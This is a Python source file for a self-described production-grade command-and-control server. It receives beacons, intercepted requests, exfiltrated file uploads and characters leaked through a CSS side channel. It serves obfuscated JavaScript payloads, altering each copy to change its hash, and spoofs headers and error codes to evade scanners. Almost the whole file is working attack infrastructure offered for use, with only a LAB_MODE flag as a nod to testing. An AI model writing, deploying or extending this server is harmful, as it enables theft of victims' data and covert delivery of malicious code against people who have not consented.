"""
c2_server.py - Production-Grade Command & Control Server
Fast, asynchronous, and scalable C2 server for receiving exfiltrated data.

Key Features:
- WSGI Production Server (Waitress)
- Rate Limiting (Flask-Limiter)
- Memory Caching for Payloads
- Rotational Structured Logging
- Asynchronous Request Handling
"""

import os
import json
import logging
import hashlib
import base64
from datetime import datetime, timezone
from logging.handlers import RotatingFileHandler
from functools import lru_cache

# Production WSGI Server
from waitress import serve
from flask import Flask, request, jsonify, make_response
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# --- Configuration ---
HOST = os.getenv('C2_HOST', '0.0.0.0')
PORT = int(os.getenv('C2_PORT', 8080))
PAYLOAD_DIR = os.path.dirname(os.path.abspath(__file__))
AUTH_KEY = os.getenv('C2_AUTH_KEY', None)
LAB_MODE = os.getenv('LAB_MODE', '0') == '1'

# Use separate directories in LAB_MODE to avoid polluting live data
if LAB_MODE:
    LOG_DIR = os.getenv('C2_LOG_DIR', os.path.join(PAYLOAD_DIR, 'tests', 'lab_logs'))
    UPLOAD_DIR = os.path.join(LOG_DIR, 'uploads')
else:
    LOG_DIR = os.path.join(PAYLOAD_DIR, 'logs')
    UPLOAD_DIR = os.path.join(PAYLOAD_DIR, 'uploads')

# Ensure directories exist
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

# --- Logging Setup ---
# Use structured JSON logging for easier parsing
logger = logging.getLogger('c2_server')
logger.setLevel(logging.INFO)

log_file = os.path.join(LOG_DIR, 'c2_events.json')
handler = RotatingFileHandler(log_file, maxBytes=10*1024*1024, backupCount=5) # 10MB logs
formatter = logging.Formatter('{"timestamp": "%(asctime)s", "level": "%(levelname)s", "event": %(message)s}')
formatter.default_msec_format = '%s.%03d'
handler.setFormatter(formatter)
logger.addHandler(handler)

# Also log to console
console = logging.StreamHandler()
console.setFormatter(logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s'))
logger.addHandler(console)

app = Flask(__name__)

# --- Rate Limiting ---
# Prevent DoS and spam
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per minute", "1000 per hour"],
    storage_uri="memory://"
)

# --- Caching ---
# Cache payload contents to reduce disk I/O
@lru_cache(maxsize=100)
def get_cached_payload(filename):
    path = os.path.join(PAYLOAD_DIR, filename)
    if os.path.exists(path):
        with open(path, 'r') as f:
            return f.read()
    return None

# --- Helper Functions ---
def log_event(event_type, data, ip=None):
    entry = {
        'type': event_type,
        'ip': ip or request.remote_addr,
        'data': data
    }
    logger.info(json.dumps(entry))

# --- Middleware ---
@app.before_request
def check_auth():
    # Only protect admin/logs endpoints, allow beacons public access
    if request.endpoint in ['view_logs', 'admin_dashboard']:
        key = request.headers.get('X-Auth-Key') or request.args.get('key')
        if AUTH_KEY and key != AUTH_KEY:
            return jsonify({'error': 'Unauthorized'}), 401

@app.after_request
def add_headers(response):
    # Security headers
    response.headers['Server'] = 'Apache' # Spoof headers
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response

# --- Routes ---

@app.route('/health', methods=['GET'])
@limiter.exempt
def health():
    return jsonify({
        'status': 'alive', 
        'version': '2.0.0', 
        'time': datetime.now(timezone.utc).isoformat()
    }), 200

@app.route('/beacon', methods=['POST'])
@limiter.limit("60 per minute") # Allow 1 beacon per sec per IP
def beacon():
    """High-performance beacon receiver."""
    try:
        data = request.get_json(silent=True) or request.form.to_dict() or {}
        # Log asynchronously in production systems (simulated here with fast return)
        log_event('beacon', data)
        return jsonify({'s': 'ok'}), 200
    except Exception as e:
        logger.error(f'{{"error": "{str(e)}"}}')
        return jsonify({'e': 'err'}), 500

@app.route('/intercept', methods=['POST'])
def intercept():
    """Service Worker interception receiver."""
    try:
        data = request.get_json(silent=True) or {}
        log_event('intercept', data)
        return jsonify({'s': 'ack'}), 200
    except Exception:
        return '', 200

@app.route('/stage/<int:stage>/<payload>', methods=['GET'])
@limiter.limit("30 per minute")
def serve_payload(stage, payload):
    """Serves obfuscated payloads with caching."""
    # Input sanitization
    safe_name = ''.join(c for c in payload if c.isalnum() or c in '._-')
    if not safe_name.endswith('.js'):
        safe_name += '.js'
    
    code = get_cached_payload(safe_name)
    
    if code:
        # Polymorphism: Add unique string to change file hash
        request_id = hashlib.md5(f"{datetime.now().timestamp()}".encode()).hexdigest()[:8]
        wrapped = f"/* {request_id} */\n{code}"
        
        log_event('payload_served', {'stage': stage, 'file': safe_name})
        
        resp = make_response(wrapped)
        resp.headers['Content-Type'] = 'application/javascript'
        resp.headers['Cache-Control'] = 'no-store' # Force re-fetch
        return resp
    
    return 'console.log("404");', 404

@app.route('/upload', methods=['POST'])
@limiter.limit("10 per minute")
def upload():
    """Handle file exfiltration."""
    try:
        if 'avatar' in request.files:
            file = request.files['avatar']
            if file.filename:
                # Sanitize filename
                ext = os.path.splitext(file.filename)[1]
                safe_name = f"{datetime.now().timestamp()}_{hashlib.md5(file.filename.encode()).hexdigest()[:6]}{ext}"
                save_path = os.path.join(UPLOAD_DIR, safe_name)
                
                file.save(save_path)
                log_event('exfil_upload', {'file': safe_name, 'size': os.path.getsize(save_path)})
                return jsonify({'s': 'up'}), 200
    except Exception as e:
        logger.error(f'{{"upload_error": "{str(e)}"}}')
    
    return jsonify({'e': 'fail'}), 500

@app.route('/css/<field>/<int:index>/<int:charcode>', methods=['GET'])
def css_exfil(field, index, charcode):
    """CSS side-channel receiver."""
    try:
        char = chr(charcode)
        log_event('css_leak', {'field': field, 'index': index, 'char': char})
    except:
        pass
    
    # Return 1x1 transparent GIF
    return b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b', 200, {'Content-Type': 'image/gif'}

@app.route('/logs', methods=['GET'])
def view_logs():
    """Admin log viewer."""
    try:
        entries = []
        if os.path.exists(log_file):
            # Read last 1000 lines (simulated tail)
            with open(log_file, 'r') as f:
                # Handle rotation in real world, simple here
                lines = f.readlines()
                entries = [json.loads(line.split('event": ')[1][:-1]) for line in lines[-100:] if 'event": ' in line]
        return jsonify(entries), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# --- Error Handlers ---
@app.errorhandler(404)
def not_found(e):
    return "", 404

@app.errorhandler(429)
def ratelimit_handler(e):
    # Return benign error to confuse scanners
    return "Service Unavailable", 503

if __name__ == '__main__':
    print(f"[+] Starting production C2 server on {HOST}:{PORT}")
    print(f"[+] Payloads: {PAYLOAD_DIR}")
    print(f"[+] Logs: {LOG_DIR}")
    
    # Production server usage
    serve(app, host=HOST, port=PORT, threads=8)
